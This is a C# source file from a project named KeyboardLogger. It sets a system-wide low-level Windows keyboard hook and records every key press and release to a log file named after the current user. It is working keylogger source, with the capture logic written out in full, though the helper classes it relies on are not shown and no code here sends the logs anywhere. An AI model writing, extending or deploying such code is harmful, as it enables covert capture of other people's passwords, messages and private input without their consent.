using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using KeyboardLogger.WindowsApi;



namespace KeyboardLogger.KeyLog
{
    class KbdHook
    {
        // data
        static IntPtr hHook = IntPtr.Zero;
        static LowLevelKeyboardProc kydbHookProc;
        static Log userLog = new Log(Environment.UserName);
        static Log headLog = new Log("head");

        public static void Init()
        {
            kydbHookProc = new LowLevelKeyboardProc(KbdHookProc);
            ProcessModule module = Process.GetCurrentProcess().MainModule;
            IntPtr hMod = Kernel32.GetModuleHandle(module.ModuleName);
            hHook = User32.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, kydbHookProc, hMod, 0);
            headLog.Write("["+Environment.UserName+"]").Flush();
        }


        // keyboard hook procedure
        static IntPtr KbdHookProc(int code, WM wParam, [In]KBDLLHOOKSTRUCT lParam)
        {
            if (code >= 0)
            {
                Keys key = (Keys)lParam.vkCode;
                string txt = (wParam == WM.KEYUP || wParam == WM.SYSKEYUP) ? key + "- " : key + " ";
                Console.WriteLine(txt);
                userLog.Write(txt);
            }
            return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
    }
}
